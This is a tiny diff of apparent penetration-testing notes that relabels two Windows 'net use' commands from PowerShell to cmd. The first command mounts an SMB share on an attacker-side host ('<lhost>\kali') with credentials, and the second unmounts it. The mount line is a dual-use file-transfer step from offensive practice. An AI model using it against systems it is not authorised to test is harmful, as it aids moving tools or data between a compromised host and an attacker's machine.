@@ -1,12 +1,12 @@
 # mount smb share to letter
 
-```powershell
+```cmd
 net use u: \\<lhost>\kali /user:username password
 ```
 
 # unmount smb share
 
-```powershell
+```cmd
 net use u: /d
 ```
 
